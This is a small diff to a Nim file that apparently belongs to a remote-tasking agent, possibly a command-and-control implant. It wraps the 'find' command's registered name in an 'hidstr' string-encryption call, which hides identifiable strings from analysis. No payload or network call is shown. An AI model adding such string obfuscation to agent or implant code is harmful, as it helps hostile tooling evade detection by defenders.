@@ -1,6 +1,7 @@
 import std/[os, json, strutils]
 import core/types
 import commands/registry
+import crypto/strenc
 
 proc findExecute(taskId: string, params: JsonNode, state: AgentState,
                  send: SendMsg): TaskResult =
@@ -26,4 +27,4 @@ proc findExecute(taskId: string, params: JsonNode, state: AgentState,
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
 proc initFind*() =
-  register("find", findExecute)
+  register(hidstr("find"), findExecute)
